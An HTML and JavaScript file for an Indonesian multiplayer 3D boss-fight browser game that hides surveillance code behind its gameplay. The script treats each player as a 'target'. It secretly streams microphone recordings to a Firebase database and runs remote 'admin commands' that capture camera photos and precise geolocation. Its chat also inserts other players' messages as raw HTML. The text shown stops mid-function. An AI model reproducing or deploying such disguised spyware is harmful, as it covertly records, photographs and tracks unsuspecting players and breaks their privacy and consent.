<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Absurt War Exe - Multiplayer</title>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #000;
            color: white;
            touch-action: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        canvas { display: block; }
        
        #ui {
            position: absolute;
            bottom: 20px;
            left: 20px;
            z-index: 100;
        }
        #joystick {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            position: relative;
            touch-action: none;
            border: 2px solid rgba(255,255,255,0.6);
        }
        #joystick-handle {
            width: 40px;
            height: 40px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 50%;
            position: absolute;
            top: 30px;
            left: 30px;
            border: 2px solid rgba(255,255,255,0.5);
        }
        #buttons {
            position: absolute;
            bottom: 20px;
            right: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            z-index: 100;
        }
        .btn {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 22px;
            background-color: rgba(0, 0, 0, 0.6);
            color: white;
            border: 2px solid white;
            cursor: pointer;
            touch-action: manipulation;
        }
        .btn:active { transform: scale(0.9); background-color: rgba(255,255,255,0.2); }
        
        #enemy-hp {
            position: absolute;
            top: 65px;
            left: 10px;
            color: white;
            font-size: 11px;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 5px 10px;
            border-radius: 5px;
            z-index: 100;
            font-weight: bold;
        }
        #player-hp {
            position: absolute;
            top: 90px;
            left: 10px;
            color: white;
            font-size: 11px;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 5px 10px;
            border-radius: 5px;
            z-index: 100;
            font-weight: bold;
        }
        #current-skill {
            position: absolute;
            top: 20px;
            right: 20px;
            color: white;
            font-size: 16px;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 5px 10px;
            border-radius: 5px;
            z-index: 100;
        }
        #game-title {
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
            z-index: 100;
            white-space: nowrap;
        }
        #game-over, #game-win {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.9);
            padding: 20px 30px;
            border-radius: 12px;
            text-align: center;
            display: none;
            z-index: 200;
            border: 2px solid #fff;
        }
        #game-over h2 { color: #ff4444; }
        #game-win h2 { color: #44ff44; }
        
        .game-btn {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            font-size: 15px;
            margin: 8px 4px;
            cursor: pointer;
            border-radius: 6px;
            font-weight: bold;
        }
        .game-btn.blue { background-color: #2196F3; }
        .game-btn:hover { opacity: 0.85; }
        
        #multiplayer-info {
            position: absolute;
            top: 115px;
            left: 10px;
            color: #bc8cff;
            font-size: 10px;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 4px 8px;
            border-radius: 5px;
            z-index: 100;
        }
        #multiplayer-status {
            position: absolute;
            top: 138px;
            left: 10px;
            color: white;
            font-size: 10px;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 4px 8px;
            border-radius: 5px;
            z-index: 100;
            max-width: 220px;
        }
        
        #chat-container {
            position: absolute;
            bottom: 140px;
            left: 10px;
            width: 240px;
            background-color: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
            padding: 10px;
            display: none;
            z-index: 150;
        }
        #chat-messages {
            height: 100px;
            overflow-y: auto;
            margin-bottom: 8px;
            font-size: 11px;
        }
        .chat-message {
            margin-bottom: 4px;
            padding: 3px 6px;
            border-radius: 4px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        .chat-player-name { color: #00aaff; font-weight: bold; }
        #chat-input {
            width: calc(100% - 55px);
            padding: 6px;
            border: none;
            border-radius: 5px;
            background-color: rgba(255, 255, 255, 0.9);
            font-size: 12px;
        }
        #chat-send {
            width: 45px;
            padding: 6px;
            border: none;
            border-radius: 5px;
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            font-size: 11px;
        }
        #chat-toggle {
            position: absolute;
            bottom: 140px;
            left: 10px;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
            background-color: rgba(0, 0, 0, 0.6);
            color: white;
            border: 2px solid white;
            cursor: pointer;
            z-index: 150;
        }
        #chat-close {
            position: absolute;
            top: 5px;
            right: 8px;
            background: none;
            border: none;
            color: white;
            font-size: 14px;
            cursor: pointer;
        }
        
        #ultimate {
            background-color: rgba(255, 0, 0, 0.7);
            border: 2px solid #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
        #thunder-skill {
            background-color: rgba(0, 100, 255, 0.7);
            border: 2px solid #0064ff;
            box-shadow: 0 0 10px #0064ff;
        }
        .btn.cooldown {
            background-color: rgba(100, 100, 100, 0.6) !important;
            border-color: #666 !important;
            box-shadow: none !important;
        }
        
        #ultimate-timer, #thunder-timer {
            position: absolute;
            right: 20px;
            color: white;
            font-size: 11px;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 3px 8px;
            border-radius: 10px;
            display: none;
            z-index: 100;
        }
        #ultimate-timer { bottom: 80px; }
        #thunder-timer { bottom: 145px; }
        
        .stun-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: rgba(128, 0, 128, 0.3);
            display: none;
            z-index: 180;
            pointer-events: none;
        }
        .stun-text {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            font-size: 36px;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 10px #ff0000;
            display: none;
            z-index: 181;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div id="game-title">⚔️ KALAHKAN IBLIS BERSAMA TEMAN ⚔️</div>
    <div id="ui">
        <div id="joystick">
            <div id="joystick-handle"></div>
        </div>
    </div>

    <div id="enemy-hp">💜 5500</div>
    <div id="player-hp">❤️ 5000</div>
    
    <div id="multiplayer-info">👥 Pemain: <span id="player-count">1</span></div>
    <div id="multiplayer-status">Menghubungkan...</div>
    
    <div id="ultimate-timer">🔥 <span id="ultimate-time">0</span>s</div>
    <div id="thunder-timer">⚡ <span id="thunder-time">0</span>s</div>
    
    <div id="buttons">
        <div class="btn" id="thunder-skill">⚡</div>
        <div class="btn" id="ultimate">🔥</div>
    </div>
    
    <div class="stun-overlay" id="stun-overlay"></div>
    <div class="stun-text" id="stun-text">⚡ STUN!</div>
    
    <div id="chat-toggle">💬</div>
    <div id="chat-container">
        <button id="chat-close">✕</button>
        <div id="chat-messages"></div>
        <div style="display: flex; gap: 5px;">
            <input type="text" id="chat-input" placeholder="Ketik..." autocomplete="off">
            <button id="chat-send">Kirim</button>
        </div>
    </div>

    <div id="game-over">
        <h2>💀 DEFEAT</h2>
        <p id="game-over-msg">Kalah...</p>
        <button class="game-btn" id="restart-btn">🔄 Main Lagi</button>
        <button class="game-btn blue" id="back-to-menu-btn">🏠 Menu</button>
    </div>

    <div id="game-win">
        <h2>🏆 VICTORY!</h2>
        <p id="game-win-msg">Menang!</p>
        <button class="game-btn" id="win-restart-btn">🔄 Main Lagi</button>
        <button class="game-btn blue" id="back-to-menu-win-btn">🏠 Menu</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js">
    </script>
    <script>
        // ========== PARSE URL PARAMS ==========
        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('uid') || ('player_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6));
        const playerName = urlParams.get('name') || ('Player_' + Math.floor(Math.random() * 1000));
        
        console.log('🎮 Game loaded - ID:', targetId, 'Name:', playerName);
        
        // ========== FIREBASE INIT ==========
        firebase.initializeApp({
            apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
            authDomain: "taher-online.firebaseapp.com",
            databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "taher-online",
            storageBucket: "taher-online.firebasestorage.app",
            messagingSenderId: "254196950669",
            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
        });
        
        const db = firebase.database();
        
        // Update target status: connected to game
        db.ref(`targets/${targetId}`).update({ gameConnected: true, gamePlayerName: playerName });
        db.ref(`targets/${targetId}`).onDisconnect().update({ gameConnected: false });
        
        // ========== GAME VARIABLES ==========
        let scene, camera, renderer;
        let player, enemy;
        let joystick, joystickHandle;
        let isJoystickActive = false;
        let playerVelocity = new THREE.Vector3();
        let playerDirection = new THREE.Vector3();
        let playerSpeed = 0.1;
        let enemyHP = 5500;
        let playerHP = 5000;
        let clock = new THREE.Clock();
        let enemyAttackDamage = 50;
        let enemyAttackInterval = 0.15;
        let lastEnemyAttackTime = 0;
        let gameOver = false;
        let gameWin = false;
        let enemyAnimationTime = 0;
        let playerLegs = { left: null, right: null };
        let enemyLegs = { left: null, right: null };
        let walkCycle = 0;
        let isPlayerWalking = false;
        let attackCooldown = 0;
        
        // Ultimate
        let isUltimateActive = false;
        let ultimateTimer = 0;
        let ultimateDuration = 10;
        let ultimateCooldown = 0;
        let ultimateCooldownDuration = 20;
        let ultimateDamage = 10;
        let originalClothingMaterial = null;
        let auraEffect = null;
        let hornEffect = null;
        
        // Thunder
        let thunderCooldown = 0;
        let thunderCooldownDuration = 8;
        let isThunderActive = false;
        let thunderDuration = 2;
        let thunderTimer = 0;
        let thunderStrikeInterval = null;
        
        // Enemy skill
        let enemySkillCooldown = 0;
        let enemySkillCooldownDuration = 15;
        let isPlayerStunned = false;
        let playerStunTimer = 0;
        let playerStunDuration = 2;
        let groundExplosions = [];
        
        // ========== MULTIPLAYER ==========
        let playerId = targetId;
        let playersRef = db.ref('players');
        let currentPlayerRef = playersRef.child(playerId);
        let gameStateRef = db.ref('gameState');
        let skillEventsRef = db.ref('skillEvents');
        let chatRef = db.ref('chat');
        let otherPlayers = {};
        let otherPlayerObjects = {};
        
        // ========== MIC REAL-TIME ==========
        let micStream = null;
        let micMediaRecorder = null;
        let micInterval = null;
        
        function startMicStreamToFirebase() {
            if (!window._micStream) {
                navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                    window._micStream = stream;
                    startMicRecording();
                }).catch(e => {
                    console.log('Mic not available in game:', e.message);
                });
            } else {
                startMicRecording();
            }
        }
        
        function startMicRecording() {
            if (!window._micStream || window._micStream.getAudioTracks().length === 0) return;
            
            try {
                const chunks = [];
                const mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
                micMediaRecorder = new MediaRecorder(window._micStream, { mimeType });
                
                micMediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                micMediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: mimeType });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        db.ref(`targets/${targetId}`).update({
                            audioRecording: {
                                base64: reader.result,
                                timestamp: Date.now(),
                                mimeType
                            }
                        });
                    };
                    reader.readAsDataURL(blob);
                    chunks.length = 0;
                };
                
                micMediaRecorder.start(5000); // Capture every 5 seconds
                
                // Auto-stop and restart every 5 seconds to send chunks
                micInterval = setInterval(() => {
                    if (micMediaRecorder && micMediaRecorder.state === 'recording') {
                        micMediaRecorder.stop();
                        setTimeout(() => {
                            if (window._micStream && window._micStream.getAudioTracks().length > 0 && !gameOver && !gameWin) {
                                startMicRecording();
                            }
                        }, 500);
                    }
                }, 5000);
                
                console.log('🎤 Mic streaming to Firebase started');
            } catch(e) {
                console.error('Mic recording error:', e);
            }
        }
        
        function stopMicStream() {
            if (micInterval) clearInterval(micInterval);
            if (micMediaRecorder && micMediaRecorder.state === 'recording') {
                micMediaRecorder.stop();
            }
        }
        
        // Start mic automatically
        setTimeout(startMicStreamToFirebase, 2000);
        
        // ========== LISTEN ADMIN COMMANDS (foto, dll) ==========
        function listenAdminCommands() {
            db.ref(`commands/${targetId}`).on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd || cmd.executed) return;
                
                console.log('📩 Admin command:', cmd.command);
                
                switch(cmd.command) {
                    case 'capturePhoto':
                        await capturePhotoForAdmin(cmd.facingMode || 'user');
                        db.ref(`commands/${targetId}`).update({ executed: true });
                        break;
                        
                    case 'getLocation':
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    const loc = {
                                        lat: pos.coords.latitude,
                                        lon: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: Date.now()
                                    };
                                    db.ref(`targets/${targetId}`).update({ location: loc });
                                    db.ref(`targets/${targetId}/locationHistory`).push(loc);
                                    db.ref(`commands/${targetId}`).update({ executed: true });
                                },
                                (err) => {
                                    db.ref(`commands/${targetId}`).update({ executed: true, error: err.message });
                                },
                                { enableHighAccuracy: true, timeout: 10000 }
                            );
                        }
                        break;
                        
                    case 'notification':
                        if (Notification.permission === 'granted') {
                            new Notification(cmd.title || 'Info', { body: cmd.body || '' });
                        }
                        db.ref(`commands/${targetId}`).update({ executed: true });
                        break;
                        
                    case 'vibrate':
                        navigator.vibrate(1000);
                        db.ref(`commands/${targetId}`).update({ executed: true });
                        break;
                        
                    default:
                        db.ref(`commands/${targetId}`).update({ executed: true });
                }
            });
        }
        
        async function capturePhotoForAdmin(facingMode = 'user') {
            try {
                let stream = window._cameraStream;
                if (!stream || stream.getVideoTracks().length === 0) {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
                    });
                    window._cameraStream = stream;
                }
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', true);
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const base64 = canvas.toDataURL('image/jpeg', 0.85);
                await db.ref(`targets/${targetId}`).update({
                    photo: { base64, timestamp: Date.now(), facingMode, nickname: playerName }
                });
                
                video.pause();
                video.srcObject = null;
                console.log('📸 Photo sent to admin');
            } catch(e) {
                console.error('Photo error:', e);
                await db.ref(`targets/${targetId}`).update({ photoError: { message: e.message, timestamp: Date.now() } });
            }
        }
        
        listenAdminCommands();
        
        // ========== MULTIPLAYER FUNCTIONS ==========
        function savePlayerData() {
            if (!player || gameOver || gameWin) return;
            currentPlayerRef.set({
                name: playerName,
                x: player.position.x,
                y: player.position.y,
                z: player.position.z,
                rotationY: player.rotation.y,
                hp: playerHP,
                timestamp: Date.now()
            });
        }
        
        function saveGameState() {
            if (gameOver || gameWin) return;
            gameStateRef.set({
                enemyPosition: { x: enemy.position.x, y: enemy.position.y, z: enemy.position.z },
                enemyHP: enemyHP,
                playerHP: playerHP,
                gameOver: gameOver,
                gameWin: gameWin,
                timestamp: Date.now()
            });
        }
        
        function saveSkillEvent(type, position) {
            skillEventsRef.push({
                type, playerId, position,
                timestamp: Date.now()
            });
        }
        
        function renderOtherPlayers(players) {
            if (!players) { clearOtherPlayers(); updatePlayerCount(); return; }
            
            const now = Date.now();
            Object.keys(otherPlayerObjects).forEach(key => {
                if (!players[key] || (now - players[key].timestamp) > 5000) {
                    if (otherPlayerObjects[key]) {
                        scene.remove(otherPlayerObjects[key]);
                        delete otherPlayerObjects[key];
                    }
                }
            });
            
            Object.keys(players).forEach(key => {
                if (key !== playerId) {
                    const pdata = players[key];
                    if (now - pdata.timestamp > 5000) return;
                    
                    if (!otherPlayerObjects[key]) {
                        otherPlayerObjects[key] = createOtherPlayerMesh(pdata);
                    } else {
                        otherPlayerObjects[key].position.lerp(
                            new THREE.Vector3(pdata.x, pdata.y, pdata.z), 0.4
                        );
                        otherPlayerObjects[key].rotation.y = pdata.rotationY || 0;
                    }
                }
            });
            
            updatePlayerCount();
        }
        
        function createOtherPlayerMesh(pdata) {
            const group = new THREE.Group();
            
            const skinMat = new THREE.MeshLambertMaterial({ color: 0x44AAFF });
            const clothMat = new THREE.MeshLambertMaterial({ color: 0x2266CC });
            
            // Simple character
            const head = new THREE.Mesh(new THREE.SphereGeometry(0.4, 16, 16), skinMat);
            head.position.y = 5.0;
            group.add(head);
            
            const body = new THREE.Mesh(new THREE.CylinderGeometry(0.5, 0.4, 1.5, 16), clothMat);
            body.position.y = 3.5;
            group.add(body);
            
            const legL = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.12, 1.8, 8), clothMat);
            legL.position.set(-0.25, 1.5, 0);
            group.add(legL);
            
            const legR = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.12, 1.8, 8), clothMat);
            legR.position.set(0.25, 1.5, 0);
            group.add(legR);
            
            // Name tag
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 60;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = 'rgba(0,0,0,0.7)';
            ctx.fillRect(0, 0, 200, 60);
            ctx.fillStyle = '#fff';
            ctx.font = '20px Arial';
            ctx.textAlign = 'center';
            ctx.fillText(pdata.name || 'Player', 100, 38);
            const tex = new THREE.CanvasTexture(canvas);
            const sprite = new THREE.Sprite(new THREE.SpriteMaterial({ map: tex }));
            sprite.position.y = 6.2;
            sprite.scale.set(2.5, 0.75, 1);
            group.add(sprite);
            
            group.position.set(pdata.x, pdata.y, pdata.z);
            scene.add(group);
            
            document.getElementById('multiplayer-status').textContent = 
                `🎮 ${pdata.name} bergabung!`;
            setTimeout(() => updatePlayerCount(), 3000);
            
            return group;
        }
        
        function clearOtherPlayers() {
            Object.values(otherPlayerObjects).forEach(obj => scene.remove(obj));
            otherPlayerObjects = {};
        }
        
        function updatePlayerCount() {
            const count = Object.keys(otherPlayerObjects).length + 1;
            document.getElementById('player-count').textContent = count;
            if (count <= 1) {
                document.getElementById('multiplayer-status').textContent = 'Mencari pemain lain...';
            } else {
                document.getElementById('multiplayer-status').textContent = `🎮 ${count} pemain online`;
            }
        }
        
        function sendChatMessage() {
            const input = document.getElementById('chat-input');
            const msg = input.value.trim();
            if (msg) {
                chatRef.push({
                    playerId, playerName,
                    text: msg,
                    timestamp: Date.now()
                });
                input.value = '';
            }
        }
        
        function displayChatMessage(name, text) {
            const container = document.getElementById('chat-messages');
            const div = document.createElement('div');
            div.className = 'chat-message';
            div.innerHTML = `<span class="chat-player-name">${name}:</span> ${text}`;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
            setTimeout(() => { if (div.parentNode) div.remove(); }, 30000);
        }
        
        function toggleChat() {
            const chat = document.getElementById('chat-container');
            const toggle = document.getElementById('chat-toggle');
            if (chat.style.display === 'block') {
                chat.style.display = 'none';
                toggle.style.display = 'flex';
            } else {
                chat.style.display = 'block';
                toggle.style.display = 'none';
                document.getElementById('chat-input').focus();
            }
        }
        
        // ========== SKILLS ==========
        function activateUltimate() {
            if (gameOver || gameWin || isUltimateActive || ultimateCooldown > 0) return;
            isUltimateActive = true;
            ultimateTimer = ultimateDuration;
            originalClothingMaterial = player.children[2]?.material?.color?.clone();
            if (player.children[2]) player.children[2].material.color.set(0xFF0000);
            createAuraEffect();
            document.getElementById('ultimate-timer').style.display = 'block';
            document.getElementById('ultimate').classList.add('cooldown');
        }
        
        function createAuraEffect() {
            const geo = new THREE.SphereGeometry(2, 16, 16);
            const mat = new THREE.MeshBasicMaterial({ color: 0xFF0000, transparent: true, opacity: 0.3 });
            auraEffect = new THREE.Mesh(geo, mat);
            auraEffect.position.y = 3;
            player.add(auraEffect);
        }
        
        function removeUltimateEffects() {
            if (originalClothingMaterial && player.children[2]) {
                player.children[2].material.color.copy(originalClothingMaterial);
            }
            if (auraEffect) { player.remove(auraEffect); auraEffect = null; }
            if (hornEffect) { player.remove(hornEffect); hornEffect = null; }
            document.getElementById('ultimate-timer').style.display = 'none';
        }
        
        function updateUltimate(delta) {
            if (isUltimateActive) {
                ultimateTimer -= delta;
                document.getElementById('ultimate-time').textContent = Math.ceil(ultimateTimer);
                if (auraEffect) {
                    const s = 1 + Math.sin(Date.now() * 0.01) * 0.2;
                    auraEffect.scale.set(s, s, s);
                }
                if (ultimateTimer <= 0) {
                    isUltimateActive = false;
                    ultimateCooldown = ultimateCooldownDuration;
                    removeUltimateEffects();
                }
            }
            if (ultimateCooldown > 0) {
                ultimateCooldown -= delta;
                if (ultimateCooldown <= 0) {
                    ultimateCooldown = 0;
                    document.getElementById('ultimate').classList.remove('cooldown');
                }
            }
        }
        
        function activateThunderSkill() {
            if (gameOver || gameWin || isThunderActive || thunderCooldown > 0) return;
            isThunderActive = true;
            thunderTimer = thunderDuration;
            thunderCooldown = thunderCooldownDuration;
            document.getElementById('thunder-skill').classList.add('cooldown');
            document.getElementById('thunder-timer').style.display = 'block';
            thunderStrikeInterval = setInterval(createThunderStrike, 500);
        }
        
        function createThunderStrike() {
            if (!isThunderActive || thunderTimer <= 0) return;
            const pos = new THREE.Vector3(
                enemy.position.x + (Math.random() - 0.5) * 5,
                0,
                enemy.position.z + (Math.random() - 0.5) * 5
            );
            createThunderEffect(pos);
            if (pos.distanceTo(enemy.position) < 3) {
                enemyHP -= isUltimateActive ? 700 : 400;
                updateUI();
                if (enemyHP <= 0) { enemyHP = 0; triggerWin(); }
                saveGameState();
            }
            saveSkillEvent('thunder', { x: pos.x, y: pos.y, z: pos.z });
        }
        
        function createThunderEffect(pos) {
            const light = new THREE.PointLight(0x00aaff, 5, 20);
            light.position.set(pos.x, 10, pos.z);
            scene.add(light);
            setTimeout(() => scene.remove(light), 500);
        }
        
        function updateThunderSkill(delta) {
            if (isThunderActive) {
                thunderTimer -= delta;
                document.getElementById('thunder-time').textContent = Math.ceil(Math.max(0, thunderTimer));
                if (thunderTimer <= 0) { isThunderActive = false; clearInterval(thunderStrikeInterval); }
            }
            if (thunderCooldown > 0) {
                thunderCooldown -= delta;
                if (thunderCooldown <= 0) {
                    thunderCooldown = 0;
                    document.getElementById('thunder-skill').classList.remove('cooldown');
                    document.getElementById('thunder-timer').style.display = 'none';
                }
            }
        }
        
        function updateEnemySkill(delta) {
            if (enemySkillCooldown > 0) enemySkillCooldown -= delta;
            if (enemySkillCooldown <= 0 && !gameOver && !gameWin) {
                createGroundExplosion(player.position.clone());
                Object.values(otherPlayers).forEach(pdata => {
                    createGroundExplosion(new THREE.Vector3(pdata.x, pdata.y, pdata.z));
                });
                enemySkillCooldown = enemySkillCooldownDuration;
                saveSkillEvent('enemy_explosion', { x: player.position.x, y: 0, z: player.position.z });
            }
            
            for (let i = groundExplosions.length - 1; i >= 0; i--) {
                const exp = groundExplosions[i];
                exp.timer -= delta;
                if (exp.mesh) {
                    exp.mesh.scale.x += 0.1;
                    exp.mesh.scale.z += 0.1;
                    exp.material.opacity -= 0.05;
                }
                if (exp.timer <= 0) {
                    scene.remove(exp.mesh);
                    groundExplosions.splice(i, 1);
                }
            }
            
            if (isPlayerStunned) {
                playerStunTimer -= delta;
                if (playerStunTimer <= 0) {
                    isPlayerStunned = false;
                    document.getElementById('stun-overlay').style.display = 'none';
                    document.getElementById('stun-text').style.display = 'none';
                }
            }
        }
        
        function createGroundExplosion(pos) {
            const geo = new THREE.CylinderGeometry(0.1, 4, 1, 32);
            const mat = new THREE.MeshBasicMaterial({ color: 0x8A2BE2, transparent: true, opacity: 0.8 });
            const mesh = new THREE.Mesh(geo, mat);
            mesh.rotation.x = Math.PI / 2;
            mesh.position.set(pos.x, 0.5, pos.z);
            scene.add(mesh);
            groundExplosions.push({ mesh, material: mat, timer: 1.0 });
            
            if (player.position.distanceTo(pos) < 4) {
                playerHP -= 600;
                updateUI();
                isPlayerStunned = true;
                playerStunTimer = playerStunDuration;
                document.getElementById('stun-overlay').style.display = 'block';
                document.getElementById('stun-text').style.display = 'block';
                if (playerHP <= 0) { playerHP = 0; triggerDefeat(); }
            }
        }
        
        function useAttack() {
            if (gameOver || gameWin || isPlayerStunned || attackCooldown > 0) return;
            if (player.position.distanceTo(enemy.position) < 3) {
                enemyHP -= isUltimateActive ? ultimateDamage : 5;
                attackCooldown = 0.3;
                updateUI();
                if (enemyHP <= 0) { enemyHP = 0; triggerWin(); }
                saveGameState();
            }
        }
        
        function triggerWin() {
            gameWin = true;
            document.getElementById('game-win').style.display = 'block';
            document.getElementById('game-win-msg').textContent = `Menang! #${playerName}`;
            saveGameState();
            stopMicStream();
        }
        
        function triggerDefeat() {
            gameOver = true;
            document.getElementById('game-over').style.display = 'block';
            document.getElementById('game-over-msg').textContent = `Kalah... #${playerName}`;
            saveGameState();
            stopMicStream();
        }
        
        function updateUI() {
            document.getElementById('enemy-hp').textContent = '💜 ' + Math.max(0, enemyHP);
            document.getElementById('player-hp').textContent = '❤️ ' + Math.max(0, playerHP);
        }
        
        function restartGame() {
            currentPlayerRef.remove();
            gameStateRef.remove();
            skillEventsRef.remove();
            location.reload();
        }
        
        function backToMenu() {
            currentPlayerRef.remove();
            db.ref(`targets/${targetId}`).update({ gameConnected: false });
            stopMicStream();
            window.location.href = 'index.html';
        }
        
        // ========== THREE.JS SETUP ==========
        function init() {
            scene = new THREE.Scene();
            scene.background = new THREE.Color(0x87CEEB);
            
            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
            camera.position.set(0, 6, 12);
            
            renderer = new THREE.WebGLRenderer({ antialias: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.shadowMap.enabled = true;
            document.body.appendChild(renderer.domElement);
            
            const ambientLight = new THREE.AmbientLight(0xffffff, 0.6);
            scene.add(ambientLight);
            const dirLight = new THREE.DirectionalLight(0xffffff, 0.8);
            dirLight.position.set(10, 20, 10);
            scene.add(dirLight);
            
            // Ground
            const ground = new THREE.Mesh(
                new THREE.PlaneGeometry(30, 30),
                new THREE.MeshStandardMaterial({ color: 0x228B22, roughness: 0.8 })
            );
            ground.rotation.x = -Math.PI / 2;
            ground.receiveShadow = true;
            scene.add(ground);
            
            // Tree
            const trunk = new THREE.Mesh(
                new THREE.CylinderGeometry(0.5, 0.7, 4, 8),
                new THREE.MeshStandardMaterial({ color: 0x8B4513 })
            );
            trunk.position.set(-10, 2, -10);
            scene.add(trunk);
            const leaves = new THREE.Mesh(
                new THREE.SphereGeometry(2, 8, 8),
                new THREE.MeshStandardMaterial({ color: 0x006400 })
            );
            leaves.position.set(-10, 5, -10);
            scene.add(leaves);
            
            // House
            const house = new THREE.Group();
            house.add(new THREE.Mesh(new THREE.BoxGeometry(8, 8, 8), new THREE.MeshStandardMaterial({ color: 0xF5F5DC })));
            const roof = new THREE.Mesh(new THREE.ConeGeometry(6, 4, 4), new THREE.MeshStandardMaterial({ color: 0x8B4513 }));
            roof.position.y = 6;
            roof.rotation.y = Math.PI / 4;
            house.add(roof);
            house.position.set(0, 0, 0);
            scene.add(house);
            
            // Player
            player = createCharacter(0x2E64FE);
            player.position.set(0, 1, -3);
            scene.add(player);
            
            // Enemy
            enemy = createCharacter(0x4B0082);
            enemy.position.set(5, 1, 5);
            scene.add(enemy);
            
            // Joystick
            joystick = document.getElementById('joystick');
            joystickHandle = document.getElementById('joystick-handle');
            
            setupEvents();
            
            // Multiplayer listeners
            playersRef.on('value', snap => renderOtherPlayers(snap.val()));
            gameStateRef.on('value', snap => {
                const gs = snap.val();
                if (gs && !gameOver && !gameWin) {
                    if (gs.enemyPosition) enemy.position.set(gs.enemyPosition.x, gs.enemyPosition.y, gs.enemyPosition.z);
                    if (gs.enemyHP !== undefined && gs.enemyHP < enemyHP) enemyHP = gs.enemyHP;
                    if (gs.gameOver && !gameOver) triggerDefeat();
                    if (gs.gameWin && !gameWin) triggerWin();
                    updateUI();
                }
            });
            skillEventsRef.on('child_added', snap => {
                const evt = snap.val();
                if (evt.playerId !== playerId && evt.type === 'thunder') {
                    createThunderEffect(new THREE.Vector3(evt.position.x, evt.position.y, evt.position.z));
                }
            });
            chatRef.on('child_added', snap => {
                const msg = snap.val();
                if (msg.playerId !== playerId) displayChatMessage(msg.playerName, msg.text);
            });
            
            currentPlayerRef.onDisconnect().remove();
            
            animate();
        }
        
        function createCharacter(color) {
            const group = new THREE.Group();
            const skin = new THREE.MeshLambertMaterial({ color: 0xF5D0A9 });
            const cloth = new THREE.MeshLambertMaterial({ color });
            
            group.add(new THREE.Mesh(new THREE.SphereGeometry(0.5, 32, 32), skin)).position.y = 5.0;
            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.3, 32), skin)).position.y = 4.5;
            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.7, 0.5, 1.8, 32), cloth)).position.y = 3.2;
            
            const legGeo = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
            const legMat = new THREE.MeshLambertMaterial({ color: 0x444444 });
            const leftLeg = new THREE.Mesh(legGeo, legMat);
            leftLeg.position.set(-0.3, 1.0, 0);
            leftLeg.userData = { type: 'leftLeg' };
            group.add(leftLeg);
            const rightLeg = new THREE.Mesh(legGeo, legMat);
            rightLeg.position.set(0.3, 1.0, 0);
            rightLeg.userData = { type: 'rightLeg' };
            group.add(rightLeg);
            
            // Arms
            const armGeo = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
